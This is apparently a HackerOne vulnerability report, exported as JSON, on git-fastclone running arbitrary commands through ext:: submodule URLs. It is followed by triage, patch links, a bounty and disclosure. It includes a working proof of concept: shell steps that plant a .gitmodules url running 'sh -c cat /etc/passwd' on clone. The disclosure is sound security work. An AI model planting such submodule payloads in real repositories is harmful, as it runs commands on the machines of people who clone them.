{"id":104465,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQ0NjU=","url":"https://hackerone.com/reports/104465","title":"git-fastclone allows arbitrary command execution through usage of ext remote URLs in submodules","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-12-10T06:51:26.573Z","submitted_at":"2015-12-10T06:51:26.573Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bburky","url":"/bburky","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/927/7063d426d6fc7bd3390b3a79d9e9c23f53fa3c78_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1644,"url":"https://hackerone.com/square-open-source","handle":"square-open-source","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/644/902e831617282e2da7c1cb7aeecf24117b9004a5_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/644/902e831617282e2da7c1cb7aeecf24117b9004a5_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Square Open Source","twitter_handle":"SquareEng","website":"https://github.com/square","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2015-8968","CVE-2015-7545"],"singular_disclosure_disabled":true,"disclosed_at":"2016-01-25T18:41:17.190Z","bug_reporter_agreed_on_going_public_at":"2016-01-19T23:21:12.840Z","team_member_agreed_on_going_public_at":"2016-01-25T18:41:16.691Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I recently discovered a security vulnerability in git that also affects other programs that manually reimplement submodule-like operations. The recent security update to git[0] concerning git-remote-ext URLs in submodules affects git-fastclone similarly. This bug was patched in Git v2.6.1, v2.5.4, v2.4.10 and v2.3.10. The issue in git was just assigned CVE-2015-7545 [2]. Google's git-repo command was affected very similarly[3] to git-fastclone and it was recently patched too.\n\nThe git team's description of the bug was: \n\u003e Some protocols (like git-remote-ext) can execute arbitrary code \n\u003e found in the URL. The URLs that submodules use may come from \n\u003e arbitrary sources (e.g., .gitmodules files in a remote \n\u003e repository), and can hurt those who blindly enable recursive \n\u003e fetch. Restrict the allowed protocols to well known and safe \n\u003e ones.\n\nSome more discussion of the vulnerability can be found in this commit message: \nhttps://github.com/git/git/commit/33cfccbbf35a56e190b79bdec5c85457c952a021\n\nBasically, the git-remote-ext remote helper (which supports \"ext::ssh example.com %S foo/repo\" URLs) allows arbitrary command execution. This normally isn't ever a concern because user always sees and trusts the URL they pass to git. However git submodules, through the .gitmodules file, allow an attacker to request the client to fetch arbitrary git URLs.\n\nBecause git-fastclone reimplements fetching submodules, you cannot take advantage of the recent fix to git. Even if the user's git is patched and up to date, git-fastclone is vulnerable.\n\nTo mitigate this, git now supports a GIT_ALLOW_PROTOCOL environment variable to whitelist the allowed protocols for all git operations. See the 33cfccb commit above for an example. You could set this to the same whitelist that git-submodule now uses.\n\n[1] https://lkml.org/lkml/2015/10/5/683\n[2] https://access.redhat.com/security/cve/cve-2015-7545\n[3] https://code.google.com/p/git-repo/issues/detail?id=210\n\n\n\nThe following commands should demonstrate the vulnerability. This repository should trigger the vulnerability on any *nix system and will cat /etc/passwd to the screen during `git fastclone ...`\n\n\n    git init malicious-ext-submodule\n    cd malicious-ext-submodule\n    \n    # This can be the URL of any valid git repository\n    # This is just used to initially create the submodule in the repo\n    git submodule add https://github.com/octocat/Hello-World malicious-submodule\n    \n    # Then rewrite the .gitmodules file to the malicious ext:: url\n    cat \u003e.gitmodules \u003c\u003c\"EOF\"\n    [submodule \"malicious-submodule\"]\n        path = malicious-submodule\n        url = \"ext::sh -c cat% /etc/passwd% \u003e\u00262\"\n    EOF\n    git add .gitmodules\n    git commit -m 'Malicious git-remote-ext submodule'\n    cd ..\n    \n    # Now clone the repository locally\n    # This works just as well if cloning from a network-based git repository as well\n    git fastclone malicious-ext-submodule malicious-ext-submodule-clone\n    \n    # Observe demonstration of command execution by printing /etc/password to stderr\n    \n    \n    # If you are running a patched version of git (e.g. v2.6.1), this command should not trigger the exploit:\n    git clone --recursive malicious-ext-submodule malicious-ext-submodule-clone","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":65071,"file_name":"fastclone_example_output.txt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/065/071/7c9a98d672807cf9a57ae578835b7d725f969d30/fastclone_example_output.txt?response-content-disposition=attachment%3B%20filename%3D%22fastclone_example_output.txt%22%3B%20filename%2A%3DUTF-8%27%27fastclone_example_output.txt\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4NIHB2M2%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131908Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIE3FUcgRK7FM%2F7U9PAkh6%2BI7wZViD1MP1Y8qZWLRN1eUAiAgc4SQu0yGJV%2BOQRn82JsTD2%2Bd2fHZQycxL60pz%2B7CjyqDBAjt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMkR9JAvrXeOfq9Rc6KtcDp5bGOpV6FTgydp%2FZOb6Bh6HFPtwnCVZfa015OiSuBfCxPwur%2F7aSPKTNE0sy0w9C45qL0zZ1nOQQos0M24uDH67J2wRZXM50ImEA29W1ENYnCggW3Oj1ThbKF4WgRsg%2F9mjcm%2BZmkVxvLoYJ9V%2BPAToGVUPNdCuARshEYKICR0Xo5x6JoDNaCt8Ld9eGqOBMXV3rned7uAPh8EmsbYJGE3kgeYkoAT36Qaqe4UgPgyO9VFwa9aDWRX%2B50CKWSjbjZzr%2BF%2B9jH4MB%2FxFZ4EWRHEor6ZAw08vWfwqAZLqqZdMNm9vuS82Y9DrOKW2mwiXSVAN3ddQvsOMXsKnTXkUhnfuaQmZvTtYFFm%2BIF8eMq92q4rbYHzak7PfNtWyYQ5raA9JIgznaWFJzJX%2BJlzu%2Bu3r2q3jjPLUM80AxozLcRqWVvYBpiIJlFx45cKPkX%2F2%2BeKoncWc%2B6ePWFPme30ZUDKqp6naa4cEDN31MhQC6Orokr1YD%2FJvOnl4SUarbB1%2BVgfPNBbXbzGIn%2BQ51fempHBLdSWygAxQb8EgPDJYVXZxvBJySlPreu1xMH98Dq97W1%2FcRuSdU1ytWMJPT5MEKol3iFlX9S3vBhB4zpCiL0Qjhs8rBVdayMKLXkIsGOqYB2%2BJTBbMxNO8iefRZNNANeiPRoGrUFs7jVSy6MeL55bB1oEjsBrS1ldm2HFxpIsKxeGY%2Fw5R4r6d07DNpzBAlMx0mvj%2FrMVfwHZDUaLkkIW7L5kfZJyauAUQfU1Yr9%2Flzl1bTl9jiK08pDtPhZS7%2FjLscylmOg0jy%2BlazgeqN9hRW54AGkI6XkZty9qqJMe%2BYbSVGEfkYqEbJxp7dv5pFW%2Ftu9oswsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=43e21f078bb38f51c3c2528fc05cdc634570fbb2ce30e5b16f48d98645ba22ac","file_size":7137,"type":"text/plain"}],"allow_singular_disclosure_at":"2016-02-18T23:21:13.332Z","allow_singular_disclosure_after":-178120675.16690433,"singular_disclosure_allowed":true,"vote_count":2,"voters":["michiel","mak"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":717793,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Can confirm that I can reproduce this. Nice finding, thanks!","automated_response":false,"created_at":"2015-12-11T21:23:06.026Z","updated_at":"2015-12-11T21:23:06.026Z","actor":{"username":"css","cleared":false,"url":"/css","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/658/c79df8b4265e62f73fa43e0fdd2eec7eb0acf62f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":717807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is awesome, great find! Feel free to send us patch too if you are interested to fix the hole.","automated_response":false,"created_at":"2015-12-11T21:31:41.057Z","updated_at":"2015-12-11T21:31:41.057Z","actor":{"username":"alokmenghrajani","cleared":false,"url":"/alokmenghrajani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/663/15433a8e00b4c83f236ae346eb728c7c2dc5ce1d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":718175,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'd fix it myself, but I haven't verified that I can sign the CLA. It might be a while before I fix it. Feel free to patch it yourself before then.","automated_response":false,"created_at":"2015-12-12T04:22:49.347Z","updated_at":"2015-12-12T04:22:49.347Z","actor":{"username":"bburky","cleared":false,"url":"/bburky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/927/7063d426d6fc7bd3390b3a79d9e9c23f53fa3c78_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":718249,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FYI, my attempt at fixing this: https://github.com/square/git-fastclone/pull/2","automated_response":false,"created_at":"2015-12-12T07:36:50.160Z","updated_at":"2015-12-12T07:36:50.160Z","actor":{"username":"alokmenghrajani","cleared":false,"url":"/alokmenghrajani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/663/15433a8e00b4c83f236ae346eb728c7c2dc5ce1d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":722278,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2015-12-16T01:28:42.123Z","updated_at":"2015-12-16T01:28:42.123Z","actor":{"url":"/square-open-source","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/644/902e831617282e2da7c1cb7aeecf24117b9004a5_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Square Open Source"}},"bounty_amount":"2000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"square-open-source","collaborator":{"username":"bburky","url":"/bburky"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":722279,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@bburky - Have you had a chance to verify?","automated_response":false,"created_at":"2015-12-16T01:29:12.311Z","updated_at":"2015-12-16T01:29:12.311Z","actor":{"username":"fiveinchpixie","cleared":false,"url":"/fiveinchpixie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/638/3ba4c197f8a972b82f8569feaabca9ce4b8a779e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bburky","url":"/bburky"},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":722294,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!\n\nThis issue was resolved with [square/git-fastclone#2][2] and [square/git-fastclone#3][3].\n\n[2]: https://github.com/square/git-fastclone/pull/2\n[3]: https://github.com/square/git-fastclone/pull/3","automated_response":false,"created_at":"2015-12-16T01:41:20.452Z","updated_at":"2015-12-16T01:41:20.452Z","actor":{"username":"bburky","cleared":false,"url":"/bburky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/927/7063d426d6fc7bd3390b3a79d9e9c23f53fa3c78_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":764465,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Requesting public disclosure per [rubysec/ruby-advisory-db#232](https://github.com/rubysec/ruby-advisory-db/pull/232).","automated_response":false,"created_at":"2016-01-19T23:21:12.876Z","updated_at":"2016-01-19T23:21:12.876Z","first_to_agree":true,"actor":{"username":"bburky","cleared":false,"url":"/bburky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/927/7063d426d6fc7bd3390b3a79d9e9c23f53fa3c78_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771278,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-01-25T18:41:16.731Z","updated_at":"2016-01-25T18:41:16.731Z","actor":{"username":"fiveinchpixie","cleared":false,"url":"/fiveinchpixie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/638/3ba4c197f8a972b82f8569feaabca9ce4b8a779e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771279,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-01-25T18:41:17.213Z","updated_at":"2016-01-25T18:41:17.213Z","actor":{"username":"fiveinchpixie","cleared":false,"url":"/fiveinchpixie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/638/3ba4c197f8a972b82f8569feaabca9ce4b8a779e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}